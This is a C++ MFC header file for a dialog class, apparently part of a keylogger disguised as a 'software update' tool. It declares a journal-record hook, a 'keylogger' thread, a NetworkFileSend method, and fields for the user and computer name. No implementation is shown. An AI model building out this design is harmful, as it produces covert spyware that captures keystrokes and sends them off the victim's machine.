// SofUpdateDlg.h : header file
//

#pragma once

LRESULT CALLBACK journalrecord(int Code, WPARAM wParam, LPARAM lParam);
DWORD WINAPI keylogger(LPVOID param);



// CSofUpdateDlg dialog
class CSofUpdateDlg : public CDialog
{
// Construction
public:
	CSofUpdateDlg(CWnd* pParent = NULL);	// standard constructor
	void NetworkFileSend(CString sPath,int iType);
	void DateCheck();
// some information
	CString sUser;
	CString sComp;
// Dialog Data
	enum { IDD = IDD_SOFUPDATE_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support
private:
	UINT_PTR pTimer;

// Implementation
protected:
	HICON m_hIcon;

	// Generated message map functions
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	DECLARE_MESSAGE_MAP()
};

